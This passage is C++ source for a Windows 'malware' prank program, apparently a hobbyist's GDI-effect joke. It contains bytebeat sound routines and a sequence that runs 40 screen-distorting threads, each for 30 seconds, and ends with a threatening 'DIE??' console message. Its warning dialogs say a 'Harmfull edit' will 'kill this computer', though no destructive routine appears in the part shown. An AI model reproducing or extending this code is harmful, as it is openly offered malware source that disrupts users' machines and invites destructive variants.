    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t | t << (t >> 23 % 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound34() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 2 & t >> 7 | t) ^ ((t << 1) + (t >> 7) & t >> 12));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound35() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8192, 8192, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8192 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 8 & 2 * t & 10 * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound36() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 10 >> t ^ 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound37() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (0x0123456789abcdef >> (t >> 10 & 15) & 19) | t * (0x1236005afed >> (t >> 11 & 14) & 15));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound38() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9000, 9000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cbrt(t << 2 | t >> 7) * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound39() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 * (4 & t >> 8) & (20 | 5 ^ (t >> 19) >> t | t >> 3)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound40() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 ^ t >> 6) * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void SPtime() {
    Sleep(30000);
}
void runSP() {
    DwmEnableComposition(0);
    clean();
    sound1();
    HANDLE th1a = CreateThread(NULL, 0, Payload1_BitBlt, NULL, 0, NULL);
    HANDLE th1b = CreateThread(NULL, 0, Shader1_RGB, NULL, 0, NULL);
    SPtime();
    TerminateThread(th1a, 0);
    TerminateThread(th1b, 0);
    CloseHandle(th1a);
    CloseHandle(th1b);
    clean();
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader2_XYPointMinus, NULL, 0, NULL);
    SPtime();
    TerminateThread(th2, 0);
    CloseHandle(th2);
    clean();
    sound3();
    HANDLE th3a = CreateThread(NULL, 0, Shader3_Wall_th3a, NULL, 0, NULL);
    HANDLE th3b = CreateThread(NULL, 0, Payload2_ScreenCube_th3b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th3a, 0);
    CloseHandle(th3a);
    clean();
    sound4();
    HANDLE th4 = CreateThread(NULL, 0, Shader4_NoName1, NULL, 0, NULL);
    SPtime();
    TerminateThread(th4, 0);
    CloseHandle(th4);
    clean();
    sound5();
    HANDLE th5 = CreateThread(NULL, 0, Shader5_NoName2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th5, 0);
    CloseHandle(th5);
    clean();
    sound6();
    HANDLE th6 = CreateThread(NULL, 0, Shader6_NoName3, NULL, 0, NULL);
    SPtime();
    TerminateThread(th6, 0);
    CloseHandle(th6);
    clean();
    sound7();
    HANDLE th7 = CreateThread(NULL, 0, Shader7_Wall2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th7, 0);
    CloseHandle(th7);
    clean();
    sound8();
    HANDLE th8 = CreateThread(NULL, 0, Shader8_NoName4, NULL, 0, NULL);
    SPtime();
    TerminateThread(th8, 0);
    CloseHandle(th8);
    clean();
    sound9();
    HANDLE th9a = CreateThread(NULL, 0, Shader9_WallMove_th9a, NULL, 0, NULL);
    HANDLE th9b = CreateThread(NULL, 0, Payload3_Icons_th9b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th9a, 0);
    CloseHandle(th9a);
    clean();
    sound10();
    HANDLE th10 = CreateThread(NULL, 0, Shader10_Wave, NULL, 0, NULL);
    SPtime();
    TerminateThread(th10, 0);
    TerminateThread(th9b, 0);
    CloseHandle(th10);
    CloseHandle(th9b);
    clean();
    sound11();
    HANDLE th11a = CreateThread(NULL, 0, Payload4a_PATINVERTHacthBrush, NULL, 0, NULL);
    HANDLE th11b = CreateThread(NULL, 0, Payload4b_Move2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th11a, 0);
    TerminateThread(th11b, 0);
    CloseHandle(th11a);
    CloseHandle(th11b);
    clean();
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Shader11_NoName5, NULL, 0, NULL);
    th9b = CreateThread(NULL, 0, Payload3_Icons_th9b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th12, 0);
    CloseHandle(th12);
    clean();
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader12_NoName6, NULL, 0, NULL);
    SPtime();
    TerminateThread(th13, 0);
    CloseHandle(th13);
    clean();
    sound14();
    HANDLE th14 = CreateThread(NULL, 0, Shader13_NoName7, NULL, 0, NULL);
    SPtime();
    TerminateThread(th14, 0);
    CloseHandle(th14);
    clean();
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader14_NoName8, NULL, 0, NULL);
    SPtime();
    TerminateThread(th15, 0);
    //TerminateThread(th3b, 0);
    CloseHandle(th15);
    //CloseHandle(th3b);
    clean();
    sound16();
    HANDLE th16a = CreateThread(NULL, 0, Shader15_Cube_th16a, NULL, 0, NULL);
    HANDLE th16b = CreateThread(NULL, 0, Payload5_PigGan_th16b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th16a, 0);
    TerminateThread(th16b, 0);
    TerminateThread(th3b, 0);
    CloseHandle(th16a);
    CloseHandle(th16b);
    CloseHandle(th3b);
    clean();
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader16_PoPo, NULL, 0, NULL);
    SPtime();
    TerminateThread(th17, 0);
    CloseHandle(th17);
    clean();
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader17_Gourd, NULL, 0, NULL);
    SPtime();
    TerminateThread(th18, 0);
    CloseHandle(th18);
    clean();
    sound19();
    HANDLE th19a = CreateThread(NULL, 0, Payload6a_XBRTri, NULL, 0, NULL);
    HANDLE th19b = CreateThread(NULL, 0, Payload6b_Textz, NULL, 0, NULL);
    SPtime();
    TerminateThread(th19a, 0);
    CloseHandle(th19a);
    clean();
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader18_Mandela, NULL, 0, NULL);
    SPtime();
    TerminateThread(th20, 0);
    CloseHandle(th20);
    clean();
    sound21();
    HANDLE th21 = CreateThread(NULL, 0, Shader19_NoName9, NULL, 0, NULL);
    SPtime();
    TerminateThread(th21, 0);
    CloseHandle(th21);
    clean();
    sound22();
    HANDLE th22 = CreateThread(NULL, 0, Shader20_Dark, NULL, 0, NULL);
    SPtime();
    TerminateThread(th22, 0);
    CloseHandle(th22);
    clean();
    sound23();
    HANDLE th23 = CreateThread(NULL, 0, Shader21_RndPixel, NULL, 0, NULL);
    SPtime();
    TerminateThread(th23, 0);
    CloseHandle(th23);
    clean();
    sound24();
    HANDLE th24 = CreateThread(NULL, 0, Shader22_Wrinkle, NULL, 0, NULL);
    SPtime();
    TerminateThread(th24, 0);
    CloseHandle(th24);
    clean();
    sound25();
    HANDLE th25 = CreateThread(NULL, 0, Shader23_Tan, NULL, 0, NULL);
    SPtime();
    TerminateThread(th25, 0);
    CloseHandle(th25);
    clean();
    sound26();
    HANDLE th26 = CreateThread(NULL, 0, Payload7_Tan2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th26, 0);
    CloseHandle(th26);
    clean();
    sound27();
    HANDLE th27 = CreateThread(NULL, 0, Shader24_NoName10, NULL, 0, NULL);
    SPtime();
    TerminateThread(th27, 0);
    CloseHandle(th27);
    clean();
    sound28();
    HANDLE th28a = CreateThread(NULL, 0, Shader25_NoName11_th28a, NULL, 0, NULL);
    HANDLE th28b = CreateThread(NULL, 0, Payload8_FrameRect_th28b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th28a, 0);
    TerminateThread(th28b, 0);
    CloseHandle(th28a);
    CloseHandle(th28b);
    clean();
    sound29();
    HANDLE th29 = CreateThread(NULL, 0, Shader26_RandomColor, NULL, 0, NULL);
    SPtime();
    TerminateThread(th29, 0);
    CloseHandle(th29);
    clean();
    sound30();
    HANDLE th30 = CreateThread(NULL, 0, Shader27_Wrinkle2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th30, 0);
    CloseHandle(th30);
    clean();
    sound31();
    HANDLE th31 = CreateThread(NULL, 0, Shader28_NoName12, NULL, 0, NULL);
    SPtime();
    TerminateThread(th31, 0);
    TerminateThread(th19b, 0);
    CloseHandle(th31);
    CloseHandle(th19b);
    clean();
    sound32();
    HANDLE th32 = CreateThread(NULL, 0, Shader29_NoName13, NULL, 0, NULL);
    SPtime();
    TerminateThread(th32, 0);
    CloseHandle(th32);
    clean();
    sound33();
    HANDLE th33 = CreateThread(NULL, 0, Shader30_NoName14, NULL, 0, NULL);
    SPtime();
    TerminateThread(th33, 0);
    CloseHandle(th33);
    clean();
    sound34();
    HANDLE th34 = CreateThread(NULL, 0, Shader31_NoName15, NULL, 0, NULL);
    SPtime();
    TerminateThread(th34, 0);
    CloseHandle(th34);
    clean();
    sound35();
    HANDLE th35 = CreateThread(NULL, 0, Shader32_NoName16, NULL, 0, NULL);
    SPtime();
    TerminateThread(th35, 0);
    CloseHandle(th35);
    clean();
    sound36();
    HANDLE th36 = CreateThread(NULL, 0, Shader33_NoName17, NULL, 0, NULL);
    SPtime();
    TerminateThread(th36, 0);
    CloseHandle(th36);
    clean();
    sound37();
    HANDLE th37 = CreateThread(NULL, 0, Shader34_NoName18, NULL, 0, NULL);
    SPtime();
    TerminateThread(th37, 0);
    CloseHandle(th37);
    clean();
    sound38();
    HANDLE th38 = CreateThread(NULL, 0, Shader35_NoName19, NULL, 0, NULL);
    SPtime();
    TerminateThread(th38, 0);
    CloseHandle(th38);
    clean();
    sound39();
    HANDLE th39 = CreateThread(NULL, 0, Shader36_NoName20, NULL, 0, NULL);
    SPtime();
    TerminateThread(th39, 0);
    TerminateThread(th9b, 0);
    CloseHandle(th39);
    CloseHandle(th9b);
    clean();
    sound40();
    HANDLE th40 = CreateThread(NULL, 0, Shader37_Last, NULL, 0, NULL);
    SPtime();
    TerminateThread(th40, 0);
    CloseHandle(th40);
    clean();
    Sleep(2000);
    AllocConsole();
    system("color 0a");
    cout << "Do you want to say bye bye to your file?";
    Sleep(2000);
    cout << endl;
    cout << "Or";
    for (int i = 0; i < 3; i++) {
        Sleep(1000);
        cout << ".";
    }
    Sleep(1000);
    system("color 40");
    cout << "DIE??";
    Sleep(3000);
}
int main() {
    SetProcessDPIAware();
    srand(time(NULL));
    FreeConsole();
    LPCWSTR MessageTextFirst = L"Warning!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-RuYiShiQu";
    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"fitbie54188.exe-warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        if (MessageBoxW(0, MessageTextSecond, L"fitbie54188.exe-last warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
        else {
            MessageBoxW(0, L"Error N17Pro3426 is life(0x78915418813141145141919810).", L"Error", MB_OK + MB_ICONERROR);
            runSP();
        }
    }
    return 0;
}